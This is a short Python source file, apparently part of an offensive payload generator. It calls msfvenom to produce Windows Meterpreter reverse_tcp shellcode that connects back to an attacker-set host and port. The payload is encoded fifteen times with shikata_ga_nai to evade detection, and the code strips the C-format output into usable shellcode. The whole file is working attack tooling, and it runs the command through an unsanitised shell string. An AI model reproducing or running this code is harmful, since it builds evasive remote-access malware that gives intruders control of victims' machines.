from subprocess import *


class Payload:

    @staticmethod
    def _create_shellcode(args):
        msfvenom = args.msfroot + "/msfvenom"
        msfvenom = (msfvenom + " -p windows/meterpreter/reverse_tcp LHOST=" + args.lhost + " LPORT=" + args.lport + " -e x86/shikata_ga_nai -i 15 -f c")
        msfhandle = Popen(msfvenom, shell=True, stdout=PIPE)
        try:
            shellcode = msfhandle.communicate()[0].decode('utf-8').split("unsigned char buf[] = ")[1]
            shellcode = shellcode.replace('\\', ',0').replace('"', '').strip()[1:-1]
            return shellcode
        except IndexError:
            raise Exception("Error: Do you have the right path to msfvenom?");
